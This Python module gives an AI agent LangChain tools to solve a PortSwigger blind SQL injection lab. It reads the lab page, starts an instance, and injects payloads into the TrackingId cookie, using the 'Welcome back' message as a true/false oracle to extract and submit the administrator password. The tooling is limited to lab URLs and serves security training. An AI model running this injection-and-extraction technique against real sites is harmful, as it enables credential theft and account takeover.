"""Browser-based tools using Playwright for interacting with PortSwigger labs."""

import asyncio
from typing import Any
from langchain_core.tools import tool
from playwright.async_api import async_playwright, Browser, Page, BrowserContext

from src.config import REQUEST_DELAY
from src.memory.progress import increment_query_count

# Global browser state
_browser: Browser | None = None
_context: BrowserContext | None = None
_page: Page | None = None

# Lock to prevent parallel browser operations (created lazily)
_browser_lock: asyncio.Lock | None = None


def get_browser_lock() -> asyncio.Lock:
    """Get or create the browser lock (must be called from async context)."""
    global _browser_lock
    if _browser_lock is None:
        _browser_lock = asyncio.Lock()
    return _browser_lock


async def get_browser() -> Browser:
    """Get or create the browser instance."""
    global _browser
    if _browser is None:
        playwright = await async_playwright().start()
        _browser = await playwright.chromium.launch(headless=True)
    return _browser


async def get_page(lab_url: str | None = None) -> Page:
    """Get or create the page instance."""
    global _context, _page
    
    browser = await get_browser()
    
    if _context is None:
        _context = await browser.new_context()
    
    if _page is None:
        _page = await _context.new_page()
        if lab_url:
            await _page.goto(lab_url)
    
    return _page


async def close_browser_async() -> None:
    """Close the browser and clean up resources."""
    global _browser, _context, _page
    
    if _page:
        await _page.close()
        _page = None
    
    if _context:
        await _context.close()
        _context = None
    
    if _browser:
        await _browser.close()
        _browser = None


@tool
async def read_lab_description(lab_info_url: str) -> dict[str, Any]:
    """Read the lab description from the PortSwigger lab information page.
    
    Call this FIRST before accessing the lab to understand what you need to do.
    
    Args:
        lab_info_url: The URL of the lab info page (e.g., 
                      https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)
                      
    Returns:
        A dictionary with the lab title, description, and goal.
    """
    try:
        page = await get_page(lab_info_url)
        await page.goto(lab_info_url)
        await page.wait_for_load_state("networkidle")
        
        # Extract lab information
        title = await page.title()
        
        # Try to get the lab title (h1)
        lab_title = ""
        try:
            h1 = await page.query_selector("h1")
            if h1:
                lab_title = await h1.text_content()
        except:
            pass
        
        # Get the main description paragraphs (NOT hints or solutions)
        description_parts = []
        try:
            # Only get paragraphs from the main content, exclude hint/solution sections
            paragraphs = await page.query_selector_all("p")
            for p in paragraphs:
                text = await p.text_content()
                # Skip short text, hints, and solution-related content
                if text and len(text.strip()) > 20:
                    text_lower = text.lower()
                    # Explicitly skip hint and solution content
                    if "hint" not in text_lower and "solution" not in text_lower:
                        description_parts.append(text.strip())
        except:
            pass
        
        # Only take first 4 paragraphs (the main description, not any extras)
        description = "\n\n".join(description_parts[:4])
        
        # Look for key information
        key_info = {
            "injection_point": "TrackingId cookie" if "tracking" in description.lower() else "Unknown",
            "true_indicator": "Welcome back" if "welcome back" in description.lower() else "Unknown",
            "target_table": "users" if "users" in description.lower() else "Unknown",
            "target_user": "administrator" if "administrator" in description.lower() else "Unknown",
        }
        
        return {
            "success": True,
            "title": lab_title or title,
            "description": description,
            "key_info": key_info,
            "url": page.url,
            "message": "Lab description retrieved. Key info extracted. Now use access_lab() to start the lab."
        }
    except Exception as e:
        return {
            "success": False,
            "error": str(e),
            "description": "",
            "message": f"Failed to read lab description: {e}"
        }


async def handle_portswigger_login(page: Page) -> bool:
    """Handle PortSwigger login if required.
    
    Returns True if login was successful or not needed.
    """
    from src.config import PORTSWIGGER_EMAIL, PORTSWIGGER_PASSWORD
    
    # Check if we're on the PortSwigger login page
    content = await page.content()
    current_url = page.url
    
    # PortSwigger login page indicators
    is_login_page = (
        "login" in current_url.lower() or 
        "Email address" in content or
        "Please enter your email address and password" in content
    )
    
    if is_login_page and "portswigger" in current_url.lower():
        if not PORTSWIGGER_EMAIL or not PORTSWIGGER_PASSWORD:
            print("PortSwigger credentials not configured in .env")
            return False
        
        try:
            # PortSwigger login form has specific structure
            # Look for inputs by various selectors
            email_input = await page.query_selector(
                'input[name="EmailAddress"], input[type="email"], input[placeholder*="email" i]'
            )
            password_input = await page.query_selector(
                'input[name="Password"], input[type="password"]'
            )
            
            if email_input and password_input:
                await email_input.fill(PORTSWIGGER_EMAIL)
                await password_input.fill(PORTSWIGGER_PASSWORD)
                
                # Click the green "Log in" button
                login_btn = await page.query_selector(
                    'button:has-text("Log in"), input[value="Log in"], button[type="submit"]'
                )
                if login_btn:
                    await login_btn.click()
                    await page.wait_for_load_state("networkidle")
                    await asyncio.sleep(3)  # Wait for redirect to lab
                    print(f"Logged in successfully, now at: {page.url}")
                    return True
            else:
                print("Could not find login form fields")
                return False
                
        except Exception as e:
            print(f"Login attempt failed: {e}")
            return False
    
    return True  # No login needed or already logged in


@tool
async def access_lab(lab_info_url: str) -> dict[str, Any]:
    """Click 'Access the lab' button to start a new lab instance.
    
    Call this AFTER reading the lab description to start the actual lab.
    This will handle PortSwigger authentication if needed.
    
    Args:
        lab_info_url: The URL of the lab info page where the 'Access the lab' button is.
                      
    Returns:
        A dictionary with the new lab instance URL.
    """
    global _page
    
    try:
        page = await get_page(lab_info_url)
        
        # Make sure we're on the lab info page
        if "portswigger.net" not in page.url or "lab" not in page.url:
            await page.goto(lab_info_url)
            await page.wait_for_load_state("networkidle")
        
        # Handle login if redirected
        await handle_portswigger_login(page)
        
        # Look for and click the "Access the lab" button - try multiple selectors
        # The button is typically an orange link with specific text
        access_button = None
        selectors = [
            'a:has-text("ACCESS THE LAB")',
            'a:has-text("Access the lab")', 
            'a.button:has-text("Access")',
            '.widget-container a[href*="web-security-academy.net"]',
            'a[class*="lab-link"]',
            '.lab-instance a',
            'a.btn--orange',
        ]
        
        for selector in selectors:
            try:
                access_button = await page.query_selector(selector)
                if access_button:
                    print(f"Found access button with selector: {selector}")
                    break
            except:
                continue
        
        # If no button found, try clicking by exact text match
        if not access_button:
            try:
                access_button = await page.get_by_role("link", name="ACCESS THE LAB").first
            except:
                pass
        
        if access_button:
            await access_button.click()
            
            # Wait for navigation - lab instances can take a moment to spin up
            await page.wait_for_load_state("networkidle")
            await asyncio.sleep(3)  # Labs need time to initialize
            
            # Handle login again if redirected after clicking
            await handle_portswigger_login(page)
            await page.wait_for_load_state("networkidle")
            
            new_url = page.url
            title = await page.title()
            content = await page.content()
            has_welcome = "Welcome back" in content
            
            # Check if we actually got to a lab instance
            is_lab_instance = "web-security-academy.net" in new_url
            
            return {
                "success": is_lab_instance,
                "lab_url": new_url,
                "title": title,
                "has_welcome_message": has_welcome,
                "is_lab_instance": is_lab_instance,
                "message": f"Lab accessed! URL: {new_url}" if is_lab_instance else f"May need manual intervention. Current URL: {new_url}"
            }
        else:
            return {
                "success": False,
                "error": "Could not find 'Access the lab' button",
                "message": "Please provide the direct lab instance URL using initialize_lab() instead."
            }
            
    except Exception as e:
        return {
            "success": False,
            "error": str(e),
            "message": f"Failed to access lab: {e}"
        }


@tool
async def initialize_lab(lab_url: str) -> dict[str, Any]:
    """Initialize the browser and navigate to a PortSwigger lab instance.
    
    Use this if you already have the lab instance URL (e.g., https://xxx.web-security-academy.net/).
    If you only have the lab description URL, use read_lab_description() and access_lab() instead.
    
    Args:
        lab_url: The URL of the PortSwigger lab instance to access.
        
    Returns:
        A dictionary with status and any relevant information about the lab page.
    """
    try:
        page = await get_page(lab_url)
        await page.goto(lab_url)
        await page.wait_for_load_state("networkidle")
        
        # Get the page title and check if we're on the lab
        title = await page.title()
        content = await page.content()
        
        # Check for common lab elements
        has_welcome = "Welcome back" in content
        
        return {
            "success": True,
            "title": title,
            "url": page.url,
            "has_welcome_message": has_welcome,
            "message": "Lab initialized successfully. Ready to test for SQL injection."
        }
    except Exception as e:
        return {
            "success": False,
            "error": str(e),
            "message": f"Failed to initialize lab: {e}"
        }


@tool
async def send_sqli_payload(payload: str) -> dict[str, Any]:
    """Send a SQL injection payload via the TrackingId cookie and check the response.
    
    IMPORTANT: Only use this AFTER successfully accessing the lab (URL must contain 
    'web-security-academy.net'). If you're still on portswigger.net, access the lab first!
    
    This tool injects the payload into the TrackingId cookie and checks if the
    response contains "Welcome back" to determine if the SQL condition was true.
    
    Args:
        payload: The SQL injection payload to append to the TrackingId cookie.
                 Example: "' AND '1'='1" or "' AND SUBSTRING(password,1,1)='a"
                 
    Returns:
        A dictionary containing:
        - success: Whether the request succeeded
        - condition_true: Whether "Welcome back" appeared (SQL condition was true)
        - query_count: The total number of queries made so far
    """
    global _page, _context
    
    if _page is None:
        return {
            "success": False,
            "error": "Browser not initialized. Call initialize_lab first.",
            "condition_true": False,
        }
    
    # CRITICAL: Verify we're on a lab instance, not the info page
    current_url = _page.url
    if "web-security-academy.net" not in current_url:
        return {
            "success": False,
            "error": f"NOT on a lab instance! Current URL: {current_url}. You must call access_lab() or initialize_lab() with a valid lab URL first.",
            "condition_true": False,
            "current_url": current_url,
        }
    
    # Use lock to prevent parallel browser operations
    async with get_browser_lock():
        try:
            # Get current URL
            current_url = _page.url
            base_url = "/".join(current_url.split("/")[:3])
            domain = current_url.split("/")[2]
            
            # Get existing cookies to find TrackingId
            cookies = await _context.cookies()
            tracking_id = None
            
            for cookie in cookies:
                if cookie["name"] == "TrackingId":
                    tracking_id = cookie["value"]
                    break
            
            if tracking_id is None:
                tracking_id = "xyz"  # Default value if no tracking cookie exists
            
            # Create the modified cookie with payload
            modified_tracking_id = tracking_id + payload
            
            # Set the modified cookie
            await _context.add_cookies([{
                "name": "TrackingId",
                "value": modified_tracking_id,
                "domain": domain,
                "path": "/",
            }])
            
            # Navigate to the page (more stable than reload)
            await _page.goto(base_url, wait_until="domcontentloaded")
            
            # Small delay to avoid rate limiting
            await asyncio.sleep(REQUEST_DELAY)
            
            # Check if "Welcome back" is in the response
            content = await _page.content()
            condition_true = "Welcome back" in content
            
            # Track the query
            query_count = increment_query_count()
            
            # Reset the cookie to original value for next test
            await _context.add_cookies([{
                "name": "TrackingId",
                "value": tracking_id,
                "domain": domain,
                "path": "/",
            }])
            
            return {
                "success": True,
                "condition_true": condition_true,
                "payload_sent": payload,
                "query_count": query_count,
                "message": f"Condition {'TRUE' if condition_true else 'FALSE'} - 'Welcome back' {'found' if condition_true else 'not found'}"
            }
            
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "condition_true": False,
                "message": f"Failed to send payload: {e}"
            }


@tool  
async def submit_solution(password: str) -> dict[str, Any]:
    """Submit the extracted password to solve the lab.
    
    Navigate to the lab's login page (via "My account" link) and log in 
    as administrator with the extracted password.
    
    Args:
        password: The password to submit for the administrator user.
        
    Returns:
        A dictionary indicating whether the lab was solved successfully.
    """
    global _page
    
    if _page is None:
        return {
            "success": False,
            "error": "Browser not initialized. Call initialize_lab first.",
        }
    
    try:
        # First, try clicking "My account" link to get to login
        my_account_link = await _page.query_selector('a:has-text("My account")')
        if my_account_link:
            await my_account_link.click()
            await _page.wait_for_load_state("networkidle")
        else:
            # Fallback: navigate directly to /login
            current_url = _page.url
            base_url = "/".join(current_url.split("/")[:3])
            login_url = f"{base_url}/login"
            await _page.goto(login_url)
            await _page.wait_for_load_state("networkidle")
        
        # The lab's login form (not PortSwigger's)
        # Fill in username field
        username_input = await _page.query_selector('input[name="username"], input[id="username"]')
        password_input = await _page.query_selector('input[name="password"], input[id="password"]')
        
        if username_input and password_input:
            await username_input.fill('administrator')
            await password_input.fill(password)
            
            # Submit the form
            submit_btn = await _page.query_selector('button[type="submit"], button:has-text("Log in"), input[type="submit"]')
            if submit_btn:
                await submit_btn.click()
            else:
                # Try pressing Enter
                await password_input.press("Enter")
            
            await _page.wait_for_load_state("networkidle")
            await asyncio.sleep(2)
        
        # Check if login was successful
        content = await _page.content()
        current_url = _page.url
        
        # Check for success indicators
        lab_solved = "Congratulations" in content or "solved" in content.lower()
        logged_in = "Log out" in content or "Your username is: administrator" in content
        
        if lab_solved:
            # Update progress to mark lab as solved
            from src.memory.progress import update_progress_field
            update_progress_field("lab_solved", True)
            
            return {
                "success": True,
                "lab_solved": True,
                "message": "Congratulations! Lab solved successfully!"
            }
        elif logged_in:
            # Update progress to mark lab as solved
            from src.memory.progress import update_progress_field
            update_progress_field("lab_solved", True)
            
            return {
                "success": True,
                "lab_solved": True,
                "logged_in": True,
                "message": "Successfully logged in as administrator! Lab should be marked as solved."
            }
        else:
            # Check if there's an error message
            error_msg = ""
            error_el = await _page.query_selector('.error, .is-warning, [class*="error"]')
            if error_el:
                error_msg = await error_el.text_content()
            
            return {
                "success": False,
                "lab_solved": False,
                "message": f"Login failed. The password '{password}' may be incorrect.",
                "error_message": error_msg,
                "current_url": current_url
            }
            
    except Exception as e:
        return {
            "success": False,
            "error": str(e),
            "lab_solved": False,
            "message": f"Failed to submit solution: {e}"
        }


@tool
async def close_browser() -> dict[str, str]:
    """Close the browser and clean up resources.
    
    Returns:
        A status message.
    """
    await close_browser_async()
    return {"status": "Browser closed successfully"}


def get_browser_tools() -> list:
    """Get all browser-related tools."""
    return [read_lab_description, access_lab, initialize_lab, send_sqli_payload, submit_solution, close_browser]

